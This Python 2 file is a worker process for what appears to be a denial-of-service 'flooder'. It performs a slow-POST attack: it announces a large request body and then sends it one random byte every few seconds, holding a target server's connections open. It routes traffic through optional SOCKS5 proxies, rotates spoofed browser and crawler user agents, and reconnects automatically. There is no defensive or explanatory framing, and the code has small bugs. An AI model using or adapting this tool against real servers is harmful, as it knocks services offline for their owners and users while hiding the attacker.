import socks, time
from Functions import *
from multiprocessing import Process

useragents = [
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
    "Googlebot/2.1 (http://www.googlebot.com/bot.html)", # rly?
    "Opera/9.20 (Windows NT 6.0; U; en)",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
    "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
    "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
    "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", # maybe not
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13"
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
    "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", # meh
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)", # also meh
    "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)" # more meh
]

class HTTPWorkerThread(Process):

    def __init__(self, flooder, id):
        Process.__init__(self)
        self.id = id
        self.socket = socks.socksocket()

        self.host = flooder.host
        self.port = flooder.port
        self.socks5ip = flooder.socks5ip
        self.socks5port = flooder.socks5port
        self.running = True

        if flooder.random:
            self.message = randomString(256)
        else:
            self.message = self.flooder.message

        print "initialized http thread"

    def stop(self):
        self.running = False

    def sendHTTPHeader(self):
        self.socket.send("POST / HTTP/1.1\r\n"
                          "Host: %s\r\n"
                          "User-Agent: %s\r\n"
                          "Connection: keep-alive\r\n"
                          "Keep-Alive: 900\r\n"
                          "Content-Length: 10000\r\n"
                          "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
                          (self.host, random.choice(useragents)))
        #print "thread", self.id, "send post"
        
        for i in range(0, 9999):
            self.socket.send(randomString(1))
            time.sleep(random.randrange(1, 3))

        self.socket.close()

    def checkProxyAlive(self):
        proxyalive = True
        s = socks.socksocket()
        #print "testing proxy connection %s:%d" % (self.socks5ip, self.socks5port)
        try:
            s.connect((self.socks5ip, self.socks5port))
        except Exception, e:
            #print "thread", self.id, "Proxy seems down %s:%d" % (self.socks5ip, self.socks5port)
            proxyalive = False
        s.close()
        return proxyalive

    def run(self):
        try:
            while self.running:
                while self.running:
                    try:
                        if self.socks5ip is not None and self.socks5port is not None:
                            if self.checkProxyAlive():
                                #print "thread", self.id, "using socks5 proxy %s %d" % (self.socks5ip, self.socks5port)
                                self.socket.setproxy(socks.PROXY_TYPE_SOCKS5, self.socks5ip, self.socks5port)
                        self.socket.connect((self.host, self.port))
                        #print "thread", self.id, "connected"
                        break
                    except Exception, e:
                        if e.args[0] == 106 or e.args[0] == 60:
                            break
                        #print "Couldn't connect:", e.args, self.host, self.port
                        time.sleep(1)
                        continue
                    break

                try:
                    self.sendHTTPHeader()
                except Exception, e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        #print "thread", self.id ,"connection broken, retrying."
                        self.socket = socks.socksocket()
                    #print "Couldn't send message on thread", self.id, "because", e.args
                    time.sleep(0.1)
                    pass
        except KeyboardInterrupt:
            return

    def __getstate__(self):
        odict = self.__dict__.copy()
        del odict['socket']
        return odict

    def __setstate__(self, dict):
        self.__dict__.update(dict)
        self.socket = socks.socksocket()
